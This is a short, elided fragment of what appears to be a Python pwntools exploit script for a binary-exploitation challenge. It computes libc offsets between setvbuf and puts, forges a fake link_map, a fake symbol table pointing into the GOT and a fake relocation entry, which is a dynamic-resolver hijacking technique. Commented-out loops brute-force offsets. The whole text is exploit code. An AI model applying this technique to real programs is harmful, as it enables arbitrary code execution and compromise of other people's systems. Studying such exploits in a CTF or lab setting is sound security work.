...
# for i in range(10):
#     libc_offset = 0x61  # Should be alignedish
#     libc_offset += i
#     print(hex(libc_offset << 4))
#     libc_offset = libc_offset  << 4

# for i in range(0x100):
#     libc_offset = (libc_offset + i ) << 8
...
offset_2_addr = libc.symbols.setbuf - libc.symbols.puts
libc_offset =  libc.symbols.setvbuf - libc.symbols.puts
offset_2_addr = 0xffffffff - (libc_offset) + 1

known_pointer = exe.got.setvbuf
...
fake = make_link_map(fake_link_map_addr, 0, offset_2_addr, exe.got.setvbuf)

# Point symtab to got -8
fake += p32(6)
fake += p32(exe.got.setvbuf -4 )
...
fake_jmprel = p32(exe.bss() + libc_offset ) + p32(r_info)
